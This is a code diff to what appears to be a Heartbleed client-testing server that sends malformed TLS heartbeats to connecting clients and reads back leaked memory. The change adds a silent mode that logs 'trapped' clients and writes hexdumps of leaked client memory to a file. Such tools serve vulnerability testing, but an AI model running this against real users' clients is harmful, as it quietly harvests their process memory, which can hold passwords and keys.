@@ -16,6 +16,8 @@ import socket
 import sys
 import struct
 import select, time
+import logging
+from datetime import datetime
 from argparse import ArgumentParser, ArgumentTypeError
 
 # OpenSSL 1.0.1f buffer size is 4096 (DEFAULT_BUFFER_SIZE), data is flushed in
@@ -50,7 +52,7 @@ def payload_len(string):
     if 0 < response_len % MAX_PLAIN_LENGTH < pl_min:
         safe_payload_len = MAX_PLAIN_LENGTH * (response_len // MAX_PLAIN_LENGTH)
         safe_payload_len += pl_min - 3 - 16
-        print(('Warning: payload length {0} ({0:#x}) will cause delays, ' +
+        logging.warning(('payload length {0} ({0:#x}) will cause delays, ' +
             'try at least {1} ({1:#x})').format(payload_len, safe_payload_len))
 
     return payload_len
@@ -76,6 +78,9 @@ parser.add_argument('-n', '--payload-length', type=payload_len, default=0xffed,
         dest='payload_len',
         help='Requested payload length including 19 bytes heartbeat type, ' +
             'payload length and padding (default %(default)#x bytes)')
+parser.add_argument('-s', '--silent-and-log', action='store_true',
+                    dest='log_to_file', default=False,
+                    help='Silent output and log to a file')
 
 
 def make_hello(sslver, cipher):
@@ -118,18 +123,21 @@ def hexdump(data):
     allzeroes = b'\0' * 16
     zerolines = 0
 
-    for i in range(0, len(data), 16):
-        line = data[i:i+16]
-        if line == allzeroes[:len(line)]:
-            zerolines += 1
-            if zerolines == 2:
-                print("*")
-            if zerolines >= 2:
-                continue
+    with open('dumps.txt', 'a') as file:
+        file.write("\nDump at %s :\n\n" % datetime.now())
 
-        print("{0:04x}: {1:47}  {2}".format(i,
-            ' '.join('{0:02x}'.format(c) for c in line),
-            ''.join(chr(c) if c >= 32 and c < 127 else '.' for c in line)))
+        for i in range(0, len(data), 16):
+            line = data[i:i+16]
+            if line == allzeroes[:len(line)]:
+                zerolines += 1
+                if zerolines == 2:
+                    file.write("*\n")
+                if zerolines >= 2:
+                    continue
+
+            file.write("{0:04x}: {1:47}  {2}\n".format(i,
+                ' '.join('{0:02x}'.format(c) for c in line),
+                ''.join(chr(c) if c >= 32 and c < 127 else '.' for c in line)))
 
 
 class Failure(Exception):
@@ -249,14 +257,14 @@ def read_hb_response(sock, timeout):
     if alert:
         lvl, desc = alert[0:1], ord(alert[1:2])
         lvl = 'Warning' if lvl == 1 else 'Fatal'
-        print('Got Alert, level={0}, description={1}'.format(lvl, desc))
+        logging.debug('Got Alert, level={0}, description={1}'.format(lvl, desc))
         if not memory:
-            print('Not vulnerable! (Heartbeats disabled or not OpenSSL)')
+            logging.debug('Not vulnerable! (Heartbeats disabled or not OpenSSL)')
             return None
 
     # Do not print error if we have memory, server could be crashed, etc.
     if read_error and not memory:
-        print('Did not receive heartbeat response! ' + str(read_error))
+        logging.debug('Did not receive heartbeat response! ' + str(read_error))
 
     return memory
 
@@ -266,7 +274,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
         self.args = self.server.args
         self.sslver = '03 01' # default to TLSv1.0
         remote_addr, remote_port = self.request.getpeername()[:2]
-        print("Connection from: {0}:{1}".format(remote_addr, remote_port))
+        logging.info("Connection from: {0}:{1}".format(remote_addr, remote_port))
 
         try:
             # Set timeout to prevent hang on clients that send nothing
@@ -274,7 +282,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
             prep_meth = 'prepare_' + self.args.client
             if hasattr(self, prep_meth):
                 getattr(self, prep_meth)(self.request)
-                print('Pre-TLS stage completed, continuing with handshake')
+                logging.debug('Pre-TLS stage completed, continuing with handshake')
 
             if not self.args.skip_server:
                 self.do_serverhello()
@@ -285,18 +293,17 @@ class RequestHandler(socketserver.BaseRequestHandler):
                         break
                 except socket.error as e:
                     if i == 0: # First heartbeat?
-                        print('Unable to send first heartbeat! ' + str(e))
+                        logging.debug('Unable to send first heartbeat! ' + str(e))
                     else:
-                        print('Unable to send more heartbeats, ' + str(e))
+                        logging.debug('Unable to send more heartbeats, ' + str(e))
                     break
         except (Failure, socket.error, socket.timeout) as e:
-            print('Unable to check for vulnerability: ' + str(e))
+            logging.info('Unable to check for vulnerability : [%s] %s'
+                         % (e.__class__.__name__, str(e)))
         except KeyboardInterrupt:
             # Don't just abort this client, stop the server too
-            print('Shutting down...')
+            logging.warning('Shutting down...')
             self.server.kill()
-
-        print('')
 
     def do_serverhello(self):
         # Read TLS record header
@@ -306,7 +313,9 @@ class RequestHandler(socketserver.BaseRequestHandler):
         if content_type == 0x80: # SSLv2 (assume length < 256)
             raise Failure('SSL 2.0 clients cannot be tested')
         else:
-            self.expect(content_type == 22, 'Expected Handshake type')
+            self.expect(content_type == 22, 'Expected Handshake type, '
+                        'this could happen if the client is trying to '
+                        'connect without encryption')
 
         # Read handshake
         hnd = self.request.recv(rec_len)
@@ -342,10 +351,10 @@ class RequestHandler(socketserver.BaseRequestHandler):
         # If memory is None, then it is not vulnerable for sure. Otherwise, if
         # empty, then it *may* be invulnerable
         if memory is not None and not memory:
-            print("Possibly not vulnerable")
+            logging.debug("Possibly not vulnerable")
             return False
         elif memory:
-            print('Client returned {0} ({0:#x}) bytes'.format(len(memory)))
+            logging.warning('Vulnerable client : returned {0} ({0:#x}) bytes'.format(len(memory)))
             hexdump(memory)
 
         return True
@@ -449,9 +458,35 @@ class PacemakerServer(socketserver.TCPServer):
         self.stopped = True
 
 
+def configure_logging(log_to_file):
+    """ Configure the logger as requested """
+
+    root_logger = logging.getLogger()
+    root_logger.setLevel(logging.DEBUG)
+
+    if log_to_file:
+        # Log to the file
+        handler = logging.FileHandler('trapped-clients.log')
+        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s',
+                                      datefmt='%d/%m %H:%M')
+        handler.setFormatter(formatter)
+        handler.setLevel(logging.INFO)
+    else:
+        # Log to stdout
+        handler = logging.StreamHandler(sys.stdout)
+        # Command-line is mainly for debugging
+        handler.setLevel(logging.DEBUG)
+
+    root_logger.addHandler(handler)
+
+
 def serve(args):
-    print('Listening on {0}:{1} for {2} clients'
+
+    configure_logging(args.log_to_file)
+
+    logging.info('Listening on {0}:{1} for {2} clients'
         .format(args.listen, args.port, args.client))
+
     server = PacemakerServer(args)
     server.serve_forever()
 
